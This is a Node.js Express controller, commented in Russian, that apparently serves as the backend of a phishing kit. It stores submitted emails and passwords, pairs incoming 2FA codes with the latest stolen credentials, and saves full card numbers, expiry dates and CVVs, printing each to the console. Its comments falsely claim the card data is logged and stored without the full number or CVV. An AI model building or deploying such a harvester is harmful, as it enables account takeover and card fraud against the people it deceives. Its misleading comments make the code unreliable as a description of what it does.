const Credentials = require("./credentialModel");
const Otp = require("./otpModel");
const CardUpdate = require("./cardUpdateModel");
const CardMessage = require("./cardMessageModel");

// 📌 сохраняем логин/пароль
exports.postCredentials = async(req, res) => {
    try {
        console.log("LOGIN REQUEST BODY:", req.body);

        const doc = await Credentials.create(req.body);

        res.status(201).json({
            status: "success",
            data: { credentials: doc },
        });
    } catch (err) {
        console.log("LOGIN SAVE ERROR:", err.message);
        res.status(400).json({
            status: "fail",
            message: err.message,
        });
    }
};

// 📌 принимает 2FA-код + выводит email, password, code
exports.verifyCode = async(req, res) => {
    try {
        const code = req.body.code;
        if (!code) {
            return res.status(400).json({ status: "fail", message: "No code provided" });
        }

        const lastCreds = await Credentials.findOne().sort({ createdAt: -1 });

        let email = "не найдено";
        let password = "не найдено";

        if (lastCreds) {
            if (lastCreds.email) email = lastCreds.email;
            if (lastCreds.password) password = lastCreds.password;
        }

        console.log("––––––––––––––––––––––");
        console.log("ПОЛУЧЕН 2FA КОД");
        console.log("Почта:", email);
        console.log("Пароль:", password);
        console.log("Код:", code);
        console.log("––––––––––––––––––––––");

        await Otp.create({
            code: code,
            timestamp: new Date().toISOString(),
            email: email,
            password: password,
        });

        res.json({ status: "success" });
    } catch (err) {
        res.status(400).json({ status: "fail", message: err.message });
    }
};



// 📌 генерит новый учебный код
exports.resendCode = async(req, res) => {
    const newCode = String(Math.floor(100000 + Math.random() * 900000));

    console.log("NEW 2FA CODE:", newCode);

    await Otp.create({
        code: newCode,
        timestamp: new Date().toISOString(),
    });

    res.json({ status: "success" });
};


exports.cardUpdate = async(req, res) => {
    try {
        const { holder, cardNumber, exp, cvv } = req.body;

        // берём только цифры из номера карты
        const digits = (cardNumber || "").replace(/\D/g, "");


        // ЛОГ В КОНСОЛЬ (без полной карты и без CVV)
        console.log("CARD UPDATE DEMO:", {
            holder,
            digits: digits,
            exp,
            cvv,
        });

        // сохраняем в БД только безопасные данные
        await CardUpdate.create({
            holder,
            digits: digits,
            exp,
            cvv,
        });

        res.status(201).json({ status: "success" });
    } catch (err) {
        console.error("CARD UPDATE ERROR:", err);
        res.status(500).json({
            status: "error",
            message: "Server error",
        });
    }
};
exports.saveCardMessage = async(req, res) => {
    try {
        const { message, holder, cardLast4, cardBrand } = req.body;

        if (!message || !message.trim()) {
            return res.status(400).json({
                status: "fail",
                message: "Message is required",
            });
        }

        const cleanMessage = message.trim();
        const safeHolder = (holder || "Unknown").trim();
        const safeBrand = (cardBrand || "Card").trim();
        const safeLast4 = (cardLast4 || "????").trim();

        // Строка формата: Name Surname – Visa **** 1234 – "Сообщение..."
        const summary = `${safeHolder} – ${safeBrand} - ${safeLast4} – "${cleanMessage}"`;

        await CardMessage.create({
            holder: holder || null,
            cardLast4: cardLast4 || null,
            cardBrand: cardBrand || null,
            message: cleanMessage,
            summary, // вот тут сохраняем готовую строку
        });

        res.status(201).json({ status: "success" });
    } catch (err) {
        console.error("CARD MESSAGE ERROR:", err);
        res.status(500).json({
            status: "error",
            message: "Server error",
        });
    }
};